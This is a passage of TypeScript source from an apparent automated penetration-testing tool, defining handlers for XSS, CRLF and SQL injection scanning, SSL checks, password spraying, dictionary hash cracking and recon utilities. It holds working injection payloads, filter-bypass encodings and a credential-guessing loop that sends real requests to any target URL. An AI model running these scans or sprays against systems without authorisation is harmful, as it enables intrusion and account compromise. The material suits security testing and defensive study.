        if (scriptBefore !== -1 && scriptEnd !== -1 && scriptBefore > scriptClose) return 'javascript';
        // Inside an HTML attribute value?
        if (/=["'][^"']*$/.test(body.slice(Math.max(0, idx - 80), idx))) return 'attribute';
        // Inside an HTML comment?
        if (window.includes('<!--') && body.lastIndexOf('<!--', idx) > body.lastIndexOf('-->', idx)) return 'comment';
        return 'html';
      };

      // Test each GET param — all 8 payload vectors
      for (const param of paramsToTest.slice(0, 10)) {
        const paramVulnerable: string[] = [];
        let capturedReq = '';
        let capturedResp = '';
        let detectedContext = '';
        for (const { payload, name, marker } of payloads) {
          try {
            const testUrl = new URL(baseUrl);
            testUrl.searchParams.set(param, payload);
            const urlStr = testUrl.toString();
            const resp = await fetch(urlStr, {
              signal: AbortSignal.timeout(6000),
              headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST-XSS/1.0)' },
            });
            const ct = resp.headers.get('content-type') ?? '';
            const body = await resp.text();
            const isHtml = ct.includes('html');
            const reflectedRaw = body.includes(marker);
            const encodedAngle = body.includes('&lt;') || body.includes('%3C');

            if (reflectedRaw && isHtml) {
              const ctx = detectContext(body, marker);
              paramVulnerable.push(`${name} [${ctx}]`);
              if (!capturedReq) {
                detectedContext = ctx;
                const p = buildPacket('GET', urlStr, `Host: ${new URL(urlStr).hostname}\nUser-Agent: T3MP3ST-XSS/1.0`, resp.status, `Content-Type: ${ct}`, body, marker);
                capturedReq = p.req;
                capturedResp = p.resp;
              }
            } else if (reflectedRaw && !isHtml) {
              outputLines.push(`  [${param}] ${name}: reflected in non-HTML (${ct}) — lower risk`);
            } else if (encodedAngle) {
              outputLines.push(`  [${param}] ${name}: angle brackets encoded/filtered`);
            }
          } catch { /* skip */ }
        }
        if (paramVulnerable.length > 0) {
          outputLines.push(`  VULNERABLE GET param "${param}": ${paramVulnerable.join(', ')}`);
          allFindings.push({
            title: 'Reflected XSS Vulnerability',
            severity: 'high' as const,
            details: `GET parameter "${param}" reflects unencoded XSS payload in HTML response (context: ${detectedContext}). Vectors: ${paramVulnerable.join(', ')}. Confirmed with nonce xss-${nonce}.`,
            provenance: 'tool' as const,
            toolName: 'xss_scan',
            toolOutput: `GET ?${param}= vulnerable [${detectedContext} context]. Vectors: ${paramVulnerable.join(', ')}`,
            httpRequest: capturedReq,
            httpResponse: capturedResp,
          });
        } else {
          outputLines.push(`  GET param "${param}": no unencoded reflection`);
        }
      }

      // Dynamic form discovery — fetch target page and extract real <form> elements
      outputLines.push(`\nDynamic form discovery on ${baseUrl}:`);
      interface DiscoveredForm { action: string; method: string; fields: string[] }
      const discoveredForms: DiscoveredForm[] = [];
      try {
        const pageResp = await fetch(baseUrl, { signal: AbortSignal.timeout(8000), headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' } });
        const pageHtml = await pageResp.text();
        // Extract all <form> elements
        const formRe = /<form[^>]*(?:action=["']?([^"'\s>]*)["']?)?[^>]*(?:method=["']?([^"'\s>]*)["']?)?[^>]*>([\s\S]*?)<\/form>/gi;
        let fm: RegExpExecArray | null;
        while ((fm = formRe.exec(pageHtml)) !== null) {
          const action = fm[1] || '';
          const method = (fm[2] || 'GET').toUpperCase();
          const body = fm[3];
          const fieldRe = /(?:name=["']([^"']+)["']|name=([^\s>]+))/gi;
          const fields: string[] = [];
          let fr: RegExpExecArray | null;
          while ((fr = fieldRe.exec(body)) !== null) fields.push(fr[1] || fr[2]);
          try {
            const actionUrl = new URL(action || baseUrl, baseUrl).href;
            discoveredForms.push({ action: actionUrl, method, fields });
          } catch { /* skip invalid action */ }
        }
        outputLines.push(`  Found ${discoveredForms.length} form(s) on page`);
        discoveredForms.forEach(f => outputLines.push(`    ${f.method} ${f.action} fields=[${f.fields.join(', ')}]`));
      } catch {
        outputLines.push('  Could not fetch page for form discovery');
      }

      // Test each discovered form — cycle through first 4 payloads per field
      const formPayloads = payloads.slice(0, 4); // script, img onerror, svg breakout, details
      for (const form of discoveredForms.slice(0, 5)) {
        for (const field of form.fields.slice(0, 8)) {
          for (const fp of formPayloads) {
            try {
              const formBody = new URLSearchParams();
              form.fields.forEach(f => formBody.set(f, f === field ? fp.payload : 'test'));
              const method = form.method === 'POST' ? 'POST' : 'GET';
              const reqHeaders = `Host: ${new URL(form.action).hostname}\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: T3MP3ST-XSS/1.0`;
              const resp = await fetch(form.action, {
                method,
                signal: AbortSignal.timeout(6000),
                headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' },
                body: method === 'POST' ? formBody.toString() : undefined,
              });
              const ct = resp.headers.get('content-type') ?? '';
              const respBody = await resp.text();
              if (respBody.includes(fp.marker) && ct.includes('html')) {
                const ctx = detectContext(respBody, fp.marker);
                outputLines.push(`  VULNERABLE: ${method} form field "${field}" → ${form.action} [${ctx}]`);
                const p = buildPacket(method, form.action, reqHeaders, resp.status, `Content-Type: ${ct}`, respBody, fp.marker);
                allFindings.push({
                  title: 'Reflected XSS in Form Field',
                  severity: 'high' as const,
                  details: `Form field "${field}" (${method} ${form.action}) reflects unencoded XSS payload in HTML (context: ${ctx}). Vector: ${fp.name}. Nonce: xss-${nonce}.`,
                  provenance: 'tool' as const,
                  toolName: 'xss_scan',
                  toolOutput: `${method} ${form.action} field=${field} [${ctx}] → ${fp.name}`,
                  httpRequest: p.req,
                  httpResponse: p.resp,
                });
                break; // one confirmed finding per field is enough
              }
            } catch { /* skip */ }
          }
        }
      }
      if (discoveredForms.length === 0) outputLines.push('  No forms found — skipping form field testing');

      // Header reflection XSS — test User-Agent and Referer for reflection in HTML responses.
      // Some apps log or display these in error pages, analytics footers, or debug panels.
      outputLines.push(`\nHeader reflection XSS (User-Agent / Referer):`);
      const headerTests = [
        { header: 'User-Agent', payload: payloads[1].payload, marker: payloads[1].marker, name: payloads[1].name },
        { header: 'Referer', payload: payloads[1].payload, marker: payloads[1].marker, name: payloads[1].name },
        { header: 'X-Forwarded-For', payload: payloads[1].payload, marker: payloads[1].marker, name: payloads[1].name },
      ];
      for (const ht of headerTests) {
        try {
          const resp = await fetch(baseUrl, {
            signal: AbortSignal.timeout(6000),
            headers: { [ht.header]: ht.payload, 'User-Agent': ht.header === 'User-Agent' ? ht.payload : 'Mozilla/5.0 (compatible; T3MP3ST/1.0)' },
          });
          const ct = resp.headers.get('content-type') ?? '';
          const body = await resp.text();
          if (body.includes(ht.marker) && ct.includes('html')) {
            const ctx = detectContext(body, ht.marker);
            outputLines.push(`  VULNERABLE: ${ht.header} header reflected in HTML [${ctx} context]`);
            const p = buildPacket('GET', baseUrl, `Host: ${new URL(baseUrl).hostname}\n${ht.header}: ${ht.payload}`, resp.status, `Content-Type: ${ct}`, body, ht.marker);
            allFindings.push({
              title: `XSS via ${ht.header} Header Reflection`,
              severity: 'high' as const,
              details: `The ${ht.header} request header is reflected unencoded in the HTML response (context: ${ctx}). An attacker can inject HTML/JS by controlling this header. Confirmed with nonce xss-${nonce}.`,
              provenance: 'tool' as const,
              toolName: 'xss_scan',
              toolOutput: `${ht.header} header reflected in HTML [${ctx}]`,
              httpRequest: p.req,
              httpResponse: p.resp,
            });
          } else {
            outputLines.push(`  ${ht.header}: not reflected in HTML`);
          }
        } catch { /* skip */ }
      }

      return {
        success: true,
        output: outputLines.join('\n'),
        findings: allFindings.length > 0 ? allFindings : undefined,
      };
    },
  },
  {
    name: 'crlf_injection',
    description: 'Test for CRLF injection — injecting \\r\\n into URL params that end up in HTTP response headers (Location, Set-Cookie, etc.)',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to test', required: true },
      { name: 'param', type: 'string', description: 'Specific parameter to test; omit to test common redirect params', required: false, default: '' },
    ],
    handler: async (context) => {
      const baseUrl = context.parameters.url as string;
      const paramOverride = String(context.parameters.param ?? '').trim();

      // CRLF payloads — various encodings of \r\n to bypass filters
      const crlfPayloads = [
        { encoded: '%0d%0a', name: 'URL-encoded CRLF' },
        { encoded: '%0a', name: 'URL-encoded LF only' },
        { encoded: '%0d', name: 'URL-encoded CR only' },
        { encoded: '%E5%98%8A%E5%98%8D', name: 'UTF-8 overlong CRLF' },
        { encoded: '%u000d%u000a', name: 'Unicode escaped CRLF' },
        { encoded: '%0d%0a%09', name: 'CRLF + tab (header folding)' },
      ];

      // Injected header to detect in responses
      const sentinel = `X-T3MP3ST-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
      const injectedValue = `injected`;

      // Params to test — redirect/location params are the highest-risk
      const redirectParams = ['next', 'url', 'redirect', 'return', 'return_url', 'redirect_uri', 'returnTo', 'goto', 'r', 'u', 'location'];
      const paramsToTest = paramOverride ? [paramOverride] : redirectParams;

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [`CRLF Injection test on ${baseUrl}`];

      let baseUrl2: URL;
      try { baseUrl2 = new URL(baseUrl); } catch { return { success: false, error: `Invalid URL: ${baseUrl}` }; }

      for (const param of paramsToTest.slice(0, 8)) {
        for (const { encoded, name } of crlfPayloads) {
          try {
            // Inject: param=value\r\nX-T3MP3ST-XXXX: injected
            const injection = `value${encoded}${sentinel}: ${injectedValue}`;
            const testUrl = new URL(baseUrl);
            testUrl.searchParams.set(param, injection);

            const resp = await fetch(testUrl.toString(), {
              signal: AbortSignal.timeout(5000),
              redirect: 'manual', // don't follow — we need to see injected headers in the redirect response
              headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST-CRLF/1.0)' },
            });

            // Check if our sentinel header appears in the response
            const injectedHeaderValue = resp.headers.get(sentinel.toLowerCase());
            const locationHeader = resp.headers.get('location') ?? '';

            if (injectedHeaderValue !== null) {
              results.push(`CRLF CONFIRMED: param="${param}" (${name}) → injected header "${sentinel}" present in response`);
              findings.push({
                title: 'CRLF Injection / HTTP Response Splitting',
                severity: 'high' as const,
                details: `Parameter "${param}" allows CRLF injection via ${name} encoding. The injected header "${sentinel}: ${injectedValue}" appeared in the HTTP response. This enables response splitting, header injection, session fixation, and XSS via Set-Cookie injection.`,
                provenance: 'tool' as const,
                toolName: 'crlf_injection',
                toolOutput: `param=${param} (${name}): injected header "${sentinel}" confirmed in response headers`,
                httpRequest: `GET ${testUrl.toString()}\nHost: ${baseUrl2.hostname}\nUser-Agent: T3MP3ST-CRLF/1.0`,
                httpResponse: `HTTP/1.1 ${resp.status}\n${sentinel}: ${injectedHeaderValue}\n...`,
              });
              break; // one confirm per param is enough
            }

            // Also check: if it's a redirect and the Location header contains our sentinel name
            if (locationHeader.toLowerCase().includes(sentinel.toLowerCase())) {
              results.push(`CRLF PARTIAL: param="${param}" (${name}) → sentinel visible in Location header (partial injection)`);
            }
          } catch { /* skip */ }
        }
      }

      if (findings.length === 0) {
        results.push(`No CRLF injection confirmed (tested ${paramsToTest.slice(0, 8).length} params × ${crlfPayloads.length} encodings)`);
      }

      return {
        success: true,
        output: results.join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'sqli_scan',
    description: 'Test for SQL injection vulnerabilities (real error-based detection)',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL with parameter to test', required: true },
      { name: 'param', type: 'string', description: 'Parameter name to test', required: true },
    ],
    handler: async (context) => {
      const baseUrl = context.parameters.url as string;
      const param = context.parameters.param as string;

      const payloads = [
        { payload: "'", name: 'Single quote', type: 'error' },
        { payload: "''", name: 'Double single quote', type: 'error' },
        { payload: "' OR '1'='1", name: 'Boolean OR true', type: 'boolean' },
        { payload: "' AND '1'='2", name: 'Boolean AND false', type: 'boolean' },
        { payload: "1 UNION SELECT NULL--", name: 'UNION attempt', type: 'union' },
        { payload: "'; WAITFOR DELAY '0:0:0'--", name: 'MSSQL time delay', type: 'time' },
        { payload: "' AND SLEEP(0)--", name: 'MySQL time delay', type: 'time' },
      ];

      // SQL error patterns to detect
      const errorPatterns = [
        /sql syntax/i, /mysql/i, /mariadb/i, /postgresql/i, /sqlite/i,
        /ora-\d{5}/i, /microsoft sql/i, /odbc/i, /jdbc/i,
        /syntax error/i, /unclosed quotation/i, /unterminated string/i,
        /quoted string not properly terminated/i, /sql command not properly ended/i,
        /invalid query/i, /database error/i, /db error/i,
        /you have an error in your sql/i, /supplied argument is not a valid/i,
      ];

      const results: { payload: string; name: string; type: string; vulnerable: boolean; indicator: string }[] = [];
      const vulnerabilities: string[] = [];

      // First, get a baseline response
      let baselineLength = 0;
      try {
        const baselineUrl = new URL(baseUrl);
        baselineUrl.searchParams.set(param, 'normalvalue');
        const baselineResp = await fetch(baselineUrl.toString(), { signal: AbortSignal.timeout(5000) });
        const baselineBody = await baselineResp.text();
        baselineLength = baselineBody.length;
      } catch {
        // Continue anyway
      }

      const allSqliFindings: NonNullable<ToolResult['findings']> = [];

      for (const { payload, name, type } of payloads) {
        try {
          const testUrl = new URL(baseUrl);
          testUrl.searchParams.set(param, payload);
          const urlStr = testUrl.toString();
          const hostHeader = testUrl.hostname;

          const response = await fetch(urlStr, {
            signal: AbortSignal.timeout(5000),
            headers: { 'User-Agent': 'Mozilla/5.0 (compatible; T3MP3ST-SQLi/1.0)' },
          });
          const body = await response.text();
          const bodyLower = body.toLowerCase();
          const ct = response.headers.get('content-type') ?? '';

          let vulnerable = false;
          let indicator = 'No indicators';

          for (const pattern of errorPatterns) {
            if (pattern.test(body)) {
              vulnerable = true;
              indicator = `SQL error detected: ${pattern.source}`;
              break;
            }
          }

          if (!vulnerable && type === 'boolean') {
            const lengthDiff = Math.abs(body.length - baselineLength);
            const percentDiff = baselineLength > 0 ? (lengthDiff / baselineLength) * 100 : 0;
            if (percentDiff > 20) {
              vulnerable = true;
              indicator = `Response length difference: ${lengthDiff} bytes (${percentDiff.toFixed(1)}%)`;
            }
          }

          if (!vulnerable && (bodyLower.includes('welcome') || bodyLower.includes('admin') || bodyLower.includes('logged in'))
              && type === 'boolean' && payload.includes('OR')) {
            vulnerable = true;
            indicator = 'Authentication bypass indicators detected';
          }

          results.push({ payload, name, type, vulnerable, indicator });
          if (vulnerable) {
            vulnerabilities.push(name);
            // Capture the confirming packet
            const snippet = body.slice(0, 300).replace(/\s+/g, ' ');
            allSqliFindings.push({
              title: 'Potential SQL Injection Vulnerability',
              severity: 'critical' as const,
              details: `Parameter "${param}" shows SQL injection via ${name}. ${indicator}. Manual verification required.`,
              provenance: 'tool' as const,
              toolName: 'sqli_scan',
              toolOutput: indicator,
              httpRequest: `GET ${urlStr}\nHost: ${hostHeader}\nUser-Agent: T3MP3ST-SQLi/1.0`,
              httpResponse: `HTTP/1.1 ${response.status}\nContent-Type: ${ct}\n\n${snippet}`,
            });
          }
        } catch {
          results.push({ payload, name, type, vulnerable: false, indicator: 'Request failed' });
        }
      }

      const output = results.map(r => {
        const status = r.vulnerable ? `⚠️ VULNERABLE - ${r.indicator}` : `✓ ${r.indicator}`;
        return `[${r.name}] ${status}`;
      }).join('\n');

      return {
        success: true,
        output: `SQL Injection scan on ${baseUrl} (param: ${param}):\n${output}`,
        findings: allSqliFindings.length > 0 ? allSqliFindings : undefined,
      };
    },
  },
  {
    name: 'ssl_scan',
    description: 'Analyze SSL/TLS configuration (real connection analysis)',
    category: 'vuln',
    parameters: [
      { name: 'host', type: 'string', description: 'Host to scan', required: true },
      { name: 'port', type: 'number', description: 'Port number', required: false, default: 443 },
    ],
    handler: async (context) => {
      const host = context.parameters.host as string;
      const port = (context.parameters.port as number) || 443;

      return new Promise((resolve) => {
        const issues: string[] = [];
        const info: string[] = [];

        const socket = tls.connect({
          host,
          port,
          servername: host, // SNI — required by Cloudflare and most modern CDNs
          rejectUnauthorized: false, // Allow self-signed for scanning
          minVersion: 'TLSv1.2' as tls.SecureVersion,
          timeout: 10000,
        }, () => {
          try {
            // Get certificate info
            const cert = socket.getPeerCertificate();
            const protocol = socket.getProtocol();
            const cipher = socket.getCipher();

            info.push(`Protocol: ${protocol || 'Unknown'}`);
            info.push(`Cipher: ${cipher?.name || 'Unknown'} (${cipher?.version || 'Unknown'})`);

            if (cert && Object.keys(cert).length > 0) {
              info.push(`Subject: ${cert.subject?.CN || 'Unknown'}`);
              info.push(`Issuer: ${cert.issuer?.CN || 'Unknown'}`);
              info.push(`Valid From: ${cert.valid_from || 'Unknown'}`);
              info.push(`Valid To: ${cert.valid_to || 'Unknown'}`);

              // Check for issues
              if (cert.valid_to) {
                const expiryDate = new Date(cert.valid_to);
                const now = new Date();
                const daysUntilExpiry = Math.floor((expiryDate.getTime() - now.getTime()) / (1000 * 60 * 60 * 24));

                if (daysUntilExpiry < 0) {
                  issues.push('⚠ CRITICAL: Certificate has expired!');
                } else if (daysUntilExpiry < 30) {
                  issues.push(`⚠ Certificate expires in ${daysUntilExpiry} days`);
                }
              }

              // Check for weak key — must distinguish EC from RSA/DSA.
              // EC keys are 192–521 bits (P-256=256, P-384=384, P-521=521); those are fine.
              // RSA/DSA keys live at 1024+ bits; anything under 2048 is weak.
              // Cipher name "ECDSA" confirms EC cert on TLS 1.2; TLS 1.3 ciphers are neutral,
              // so use bit-size as the tiebreaker (≤521 → EC, >521 → RSA/DSA).
              if (cert.bits) {
                const cipherName = (cipher?.name ?? '').toUpperCase();
                const isECKey = cipherName.includes('ECDSA') || cert.bits <= 521;
                if (isECKey && cert.bits < 192) {
                  issues.push(`⚠ Weak EC key: ${cert.bits} bits (recommend P-256/384/521)`);
                } else if (!isECKey && cert.bits < 2048) {
                  issues.push(`⚠ Weak RSA/DSA key: ${cert.bits} bits (recommend 2048+)`);
                }
                // EC-256/384/521 are all standard — no warning needed
              }

              // Check for self-signed
              if (cert.subject?.CN === cert.issuer?.CN) {
                issues.push('⚠ Self-signed certificate detected');
              }
            }

            // Check protocol version
            if (protocol === 'TLSv1' || protocol === 'TLSv1.1') {
              issues.push(`⚠ Outdated protocol: ${protocol} (should use TLSv1.2+)`);
            }

            // Check cipher strength
            if (cipher?.name) {
              const weakCiphers = ['RC4', 'DES', '3DES', 'MD5', 'NULL', 'EXPORT', 'anon'];
              for (const weak of weakCiphers) {
                if (cipher.name.toUpperCase().includes(weak)) {
                  issues.push(`⚠ Weak cipher detected: ${cipher.name}`);
                  break;
                }
              }
            }

            socket.end();

            const output = `SSL/TLS scan of ${host}:${port}:\n\n` +
              `Connection Info:\n${info.map(i => `  ${i}`).join('\n')}\n\n` +
              (issues.length > 0
                ? `Issues Found:\n${issues.map(i => `  ${i}`).join('\n')}`
                : '✓ No critical issues found');

            resolve({
              success: true,
              output,
              findings: issues.length > 0 ? [{
                title: 'SSL/TLS Configuration Issues',
                severity: issues.some(i => i.includes('CRITICAL') || i.includes('expired')) ? 'critical' : 'medium',
                details: issues.join('; '),
              }] : undefined,
            });
          } catch (err) {
            socket.end();
            resolve({
              success: false,
              error: `SSL analysis failed: ${err instanceof Error ? err.message : String(err)}`,
            });
          }
        });

        socket.on('error', (err) => {
          resolve({
            success: false,
            error: `SSL connection failed: ${err.message}`,
          });
        });

        socket.on('timeout', () => {
          socket.destroy();
          resolve({
            success: false,
            error: `SSL connection timed out to ${host}:${port}`,
          });
        });
      });
    },
  },

  // =============================================================================
  // CREDENTIAL TOOLS
  // =============================================================================
  {
    name: 'password_spray',
    description: 'Test common passwords against a login endpoint (real HTTP requests)',
    category: 'auth',
    parameters: [
      { name: 'url', type: 'string', description: 'Login URL', required: true },
      { name: 'username', type: 'string', description: 'Username to test', required: true },
      { name: 'username_field', type: 'string', description: 'Username field name', required: false, default: 'username' },
      { name: 'password_field', type: 'string', description: 'Password field name', required: false, default: 'password' },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;
      const username = context.parameters.username as string;
      const usernameField = context.parameters.username_field as string || 'username';
      const passwordField = context.parameters.password_field as string || 'password';

      const passwords = ['password', '123456', 'admin', 'letmein', 'welcome', 'Password1', 'password123', 'qwerty', 'abc123', '111111'];
      const results: { password: string; status: number; success: boolean; indicator: string }[] = [];
      const validCredentials: string[] = [];

      // Get a baseline failed login response
      let baselineLength = 0;
      let baselineStatus = 0;
      try {
        const baselineBody = new URLSearchParams();
        baselineBody.set(usernameField, username);
        baselineBody.set(passwordField, 'definitely_invalid_password_xyz123!@#');

        const baselineResp = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: baselineBody.toString(),
          redirect: 'manual',
          signal: AbortSignal.timeout(5000),
        });
        baselineStatus = baselineResp.status;
        const baselineText = await baselineResp.text();
        baselineLength = baselineText.length;
      } catch {
        return {
          success: false,
          error: `Failed to connect to login endpoint: ${url}`,
        };
      }

      // Test each password
      for (const password of passwords) {
        try {
          const body = new URLSearchParams();
          body.set(usernameField, username);
          body.set(passwordField, password);

          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: body.toString(),
            redirect: 'manual',
            signal: AbortSignal.timeout(5000),
          });

          const status = response.status;
          const responseText = await response.text();
          const responseLower = responseText.toLowerCase();

          let success = false;
          let indicator = 'No change';

          // Check for redirect (common success indicator)
          if (status === 302 || status === 301 || status === 303) {
            const location = response.headers.get('location') || '';
            if (!location.includes('login') && !location.includes('error')) {
              success = true;
              indicator = `Redirect to ${location}`;
            }
          }

          // Check for success indicators in response
          const successIndicators = ['welcome', 'dashboard', 'logged in', 'logout', 'my account', 'profile'];
          const failureIndicators = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied'];

          if (!success) {
            for (const ind of successIndicators) {
              if (responseLower.includes(ind)) {
                success = true;
                indicator = `Contains "${ind}"`;
                break;
              }
            }
          }

          // Check for significant response length change
          if (!success) {
            const lengthDiff = Math.abs(responseText.length - baselineLength);
            const percentDiff = baselineLength > 0 ? (lengthDiff / baselineLength) * 100 : 0;
            if (percentDiff > 30 && !failureIndicators.some(f => responseLower.includes(f))) {
              success = true;
              indicator = `Response length change: ${percentDiff.toFixed(1)}%`;
            }
          }

          // Check for status code change
          if (!success && status !== baselineStatus && (status === 200 || status === 302)) {
            success = true;
            indicator = `Status changed: ${baselineStatus} -> ${status}`;
          }

          results.push({ password, status, success, indicator });
          if (success) {
            validCredentials.push(password);
          }

          // Add small delay to avoid rate limiting
          await new Promise(r => setTimeout(r, 200));
        } catch {
          results.push({ password, status: 0, success: false, indicator: 'Request failed' });
        }
      }

      const output = results.map(r => {
        const status = r.success ? `✓ POSSIBLE VALID - ${r.indicator}` : `✗ ${r.indicator}`;
        return `${r.password} - ${status}`;
      }).join('\n');

      return {
        success: true,
        output: `Password spray on ${url} for user ${username}:\n${output}`,
        findings: validCredentials.length > 0 ? [{
          title: 'Potential Valid Credentials Found',
          severity: 'critical',
          details: `User "${username}" may have weak password: ${validCredentials.join(', ')}. Manual verification required.`,
        }] : undefined,
      };
    },
  },
  {
    name: 'hash_crack',
    description: 'Attempt to crack a password hash using dictionary attack',
    category: 'auth',
    parameters: [
      { name: 'hash', type: 'string', description: 'Hash to crack', required: true },
      { name: 'type', type: 'string', description: 'Hash type: md5, sha1, sha256, ntlm (auto-detect if not specified)', required: false, default: 'auto' },
    ],
    handler: async (context) => {
      const { createHash } = await import('crypto');
      const hash = (context.parameters.hash as string).toLowerCase();
      const hashType = context.parameters.type as string || 'auto';

      // Detect hash type based on length and format
      let detectedType = 'Unknown';
      const possibleTypes: string[] = [];

      if (hash.length === 32 && /^[a-f0-9]+$/.test(hash)) {
        detectedType = 'MD5 or NTLM';
        possibleTypes.push('md5', 'ntlm');
      } else if (hash.length === 40 && /^[a-f0-9]+$/.test(hash)) {
        detectedType = 'SHA1';
        possibleTypes.push('sha1');
      } else if (hash.length === 64 && /^[a-f0-9]+$/.test(hash)) {
        detectedType = 'SHA256';
        possibleTypes.push('sha256');
      } else if (hash.length === 128 && /^[a-f0-9]+$/.test(hash)) {
        detectedType = 'SHA512';
        possibleTypes.push('sha512');
      }

      if (hashType !== 'auto') {
        possibleTypes.length = 0;
        possibleTypes.push(hashType.toLowerCase());
        detectedType = hashType.toUpperCase();
      }

      // Common passwords dictionary for cracking
      const wordlist = [
        'password', '123456', '12345678', 'qwerty', 'abc123', 'monkey', 'letmein',
        'dragon', 'master', 'admin', 'root', 'toor', 'login', 'welcome', 'shadow',
        'sunshine', 'princess', 'football', 'baseball', 'iloveyou', 'trustno1',
        'password1', 'password123', 'pass123', 'Password1', 'Password123',
        '123456789', '12345', '1234567', '1234567890', 'qwerty123', 'qwertyuiop',
        'passw0rd', 'p@ssword', 'p@ssw0rd', 'secret', 'test', 'testing', 'user',
        'guest', 'administrator', 'default', 'changeme', 'summer', 'winter',
        '111111', '000000', '123123', '654321', 'superman', 'batman', 'michael',
        'jennifer', 'jordan', 'hunter', 'ranger', 'buster', 'charlie', 'thomas',
      ];

      // Function to compute hash
      const computeHash = (plaintext: string, type: string): string => {
        if (type === 'ntlm') {
          // NTLM hash: MD4 of UTF-16LE encoded password
          const utf16 = Buffer.from(plaintext, 'utf16le');
          return createHash('md4').update(utf16).digest('hex');
        }
        return createHash(type).update(plaintext).digest('hex');
      };

      let crackedPassword: string | null = null;
      let crackedType: string | null = null;
      let attempts = 0;

      // Try cracking with each hash type
      for (const type of possibleTypes) {
        for (const word of wordlist) {
          attempts++;
          try {
            const computed = computeHash(word, type);
            if (computed === hash) {
              crackedPassword = word;
              crackedType = type.toUpperCase();
              break;
            }
          } catch {
            // Skip unsupported hash types
          }
        }
        if (crackedPassword) break;
      }

      const output = crackedPassword
        ? `Hash crack attempt:
Hash: ${hash}
Detected type: ${detectedType}
Status: ✓ CRACKED
Plaintext: ${crackedPassword}
Hash type: ${crackedType}
Attempts: ${attempts}`
        : `Hash crack attempt:
Hash: ${hash}
Detected type: ${detectedType}
Status: ✗ Not cracked
Attempts: ${attempts} (tried ${wordlist.length} common passwords)
Note: Consider using larger wordlists (rockyou.txt) or hashcat for better results`;

      return {
        success: true,
        output,
        findings: crackedPassword ? [{
          title: 'Weak Password Hash Cracked',
          severity: 'critical',
          details: `Hash cracked to plaintext: "${crackedPassword}" using ${crackedType}`,
        }] : undefined,
      };
    },
  },

  // =============================================================================
  // UTILITY TOOLS
  // =============================================================================
  {
    name: 'base64_decode',
    description: 'Decode base64 encoded data',
    category: 'util',
    parameters: [
      { name: 'data', type: 'string', description: 'Base64 data to decode', required: true },
    ],
    handler: async (context) => {
      const data = context.parameters.data as string;
      try {
        const decoded = Buffer.from(data, 'base64').toString('utf-8');
        return { success: true, output: `Decoded: ${decoded}` };
      } catch {
        return { success: false, error: 'Invalid base64 data' };
      }
    },
  },
  {
    name: 'jwt_decode',
    description: 'Decode and analyze a JWT token',
    category: 'util',
    parameters: [
      { name: 'token', type: 'string', description: 'JWT token to analyze', required: true },
    ],
    handler: async (context) => {
      const token = context.parameters.token as string;
      const parts = token.split('.');
      if (parts.length !== 3) {
        return { success: false, error: 'Invalid JWT format' };
      }
      try {
        const b64urlDecode = (s: string) => Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString();
        const header = JSON.parse(b64urlDecode(parts[0]));
        const payload = JSON.parse(b64urlDecode(parts[1]));
        const issues: string[] = [];
        if (header.alg === 'none') issues.push('⚠ Algorithm is "none" - VULNERABLE');
        if (header.alg === 'HS256') issues.push('⚠ HS256 may be vulnerable to key confusion');
        if (payload.exp && payload.exp < Date.now() / 1000) issues.push('⚠ Token is expired');
        return {
          success: true,
          output: `JWT Analysis:
Header: ${JSON.stringify(header, null, 2)}
Payload: ${JSON.stringify(payload, null, 2)}
${issues.length ? `Issues:\n${issues.join('\n')}` : '✓ No obvious issues'}`,
        };
      } catch {
        return { success: false, error: 'Failed to decode JWT' };
      }
    },
  },

  // =============================================================================
  // ADDITIONAL RECONNAISSANCE TOOLS
  // =============================================================================
  {
    name: 'robots_txt_fetch',
    description: 'Fetch and parse robots.txt, extract disallowed paths and sitemaps',
    category: 'recon',
    parameters: [
      { name: 'url', type: 'string', description: 'Base URL of the target (e.g., https://example.com)', required: true },
    ],
    handler: async (context) => {
      const baseUrl = (context.parameters.url as string).replace(/\/+$/, '');

      try {
        const robotsUrl = `${baseUrl}/robots.txt`;
        const response = await fetch(robotsUrl, {
          signal: AbortSignal.timeout(10000),
        });

        if (response.status === 404) {
          return {
            success: true,
            output: `robots.txt not found at ${robotsUrl} (404)`,
          };
        }

        if (!response.ok) {
          return {
            success: false,
            error: `Failed to fetch robots.txt: HTTP ${response.status}`,
          };
        }

        const body = await response.text();
        const lines = body.split('\n');

        const disallowed: string[] = [];
        const allowed: string[] = [];
        const sitemaps: string[] = [];
        let currentUserAgent = '';

        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed.startsWith('#') || trimmed === '') continue;

          const colonIndex = trimmed.indexOf(':');
          if (colonIndex === -1) continue;

          const directive = trimmed.slice(0, colonIndex).trim().toLowerCase();
          const value = trimmed.slice(colonIndex + 1).trim();

          switch (directive) {
            case 'user-agent':
              currentUserAgent = value;
              break;
            case 'disallow':
              if (value) disallowed.push(`[${currentUserAgent}] ${value}`);
              break;
            case 'allow':
              if (value) allowed.push(`[${currentUserAgent}] ${value}`);
              break;
            case 'sitemap':
              if (value) sitemaps.push(value);
              break;
          }
        }

        const sections: string[] = [];
        sections.push(`robots.txt for ${baseUrl}:`);
        if (disallowed.length > 0) {
          sections.push(`\nDisallowed Paths (${disallowed.length}):\n${disallowed.map(d => `  ${d}`).join('\n')}`);
        }
        if (allowed.length > 0) {
          sections.push(`\nExplicitly Allowed Paths (${allowed.length}):\n${allowed.map(a => `  ${a}`).join('\n')}`);
        }
        if (sitemaps.length > 0) {
          sections.push(`\nSitemaps (${sitemaps.length}):\n${sitemaps.map(s => `  ${s}`).join('\n')}`);
        }
